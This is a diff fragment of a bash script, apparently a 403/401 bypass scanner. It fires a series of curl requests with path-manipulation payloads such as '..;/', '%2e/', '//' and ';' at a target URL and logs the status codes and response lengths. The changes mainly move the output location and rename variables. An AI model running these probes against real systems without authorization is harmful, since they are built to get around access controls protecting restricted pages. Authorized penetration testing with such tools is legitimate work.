+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent")
 print
 echo -n "Payload [ # ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent")
 print
 echo -n "Payload [ / ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent")
 print
 echo -n "Payload [ /.randomstring ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent")
 print
 echo -n "Payload [ ..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent")
 print
 echo -n "Payload [ .html ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent")
 print
 echo -n "Payload [ %20/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent")
 print
-echo -n "Payload [ %20$path%20/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/%20$path%20/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/%20$path%20/" -H "$user_agent")
+echo -n "Payload [ %20$PAT%20/ ]:"
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20$PAT%20/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20$PAT%20/" -H "$user_agent")
 print
 echo -n "Payload [ .json ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent")
 print
 echo -n "Payload [ \..\.\ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent")
 print
 echo -n "Payload [ /* ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent")
 print
 echo -n "Payload [ ./. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent")
 print
 echo -n "Payload [ /*/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent")
 print
 echo -n "Payload [ /..;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent")
 print
-echo -n "Payload [%2e/$path ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/%2e/$path" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/%2e/$path" -H "$user_agent")
+echo -n "Payload [%2e/$PAT ]:"
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/$PAT" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/$PAT" -H "$user_agent")
 print
 echo -n "Payload [ /%2e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
 print
 echo -n "Payload [ //. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent")
 print
 echo -n "Payload [ //// ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent")
 print
 echo -n "Payload [ /../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
 print
-echo -n "Payload [ ;$path/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/;$path/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$target/;$path/" -H "$user_agent")
+echo -n "Payload [ ;$PAT/ ]:"
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;$PAT/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;$PAT/" -H "$user_agent")
 print
 
-echo "All done, scan results in $outdir"
-wc "$outdir"/* | sort -uV
+echo -e ${green}"All done, scan results in $PWD"${end}
+wc * | sort -un | grep -vF total
